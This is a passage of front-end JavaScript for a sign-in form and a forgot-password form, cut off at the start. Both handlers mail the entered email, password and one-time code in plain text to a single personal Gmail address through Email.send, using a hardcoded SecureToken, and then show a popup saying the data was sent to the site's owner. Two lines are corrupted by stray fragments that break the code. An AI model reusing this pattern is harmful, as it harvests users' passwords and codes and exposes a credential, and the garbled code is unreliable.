 = document.querySelector(".signIn #email").value
   let signUpPass = document.querySelector(".signIn #pass").value-120ms

      if( signUpEmail.length == 0 || signUpPass.length == 0){
       swal("ERROR", "Please fill Every Details", "error");
     }else{
       
     Email.send({
     SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
     To : 'mukhtar.alam458546@gmail.com',
     From : "mukhtar.alam458546@gmail.com",
     Subject : "SIGN IN DATA",
     Body : "Email : " + signUpEmail
          + "<br> Pass : " + signUpPass
     }).then(
     message => swal("Login Successfully", "Your data sent to Mr. Mukhtar Alam", "success")
     )
     }
})

 //FOR FORGETPAGE PAGE DATA TRANSFER TO ADMIN
let FORGETPAGEBTN =  document.querySelector("#resetBtn") 
FORGETPAGEBTN.addEventListener("click",function(){
   let signUpEmail = document.querySelector(".frgtPage #email").value
   let signUpOtp = document.querySelector(".frgtPage #otp").value
   let signUpPass = document.querySelector(".frgtPage #pass").value
   let signUpPassC = document.querySelector(".frgtPage #passC").value

    if( signUpEmail.length == 0 || signUpOtp.length == 0 ||  signUpPass.length == 0 || signUpPassC.length == 0){
      swal("ERROR", "Please fill Every Details", "error");
    }else{
       Email.send({
       SecureToken : "925d1fee-c803-4d93-a09c-c79ad4da638f",
       To : 'mukhtar.alam458546@gmail.com',
       From : "mukhtar.alam458546@gmail.com",
       Subject : "FORGET PASS DATA",
       Body : "Email : " + signUpEmail
              + "<br> OTP : " + signUpOtp
              + "<br> Pass : " +ig996522 signUpPass
              + "<br> Pass Confirm : " + signUpPassC
       }).then(
       message => swal("Reset Password Successfully", "Your data sent to Mr. Mukhtar Alam", "success")
       )
       }
    })
  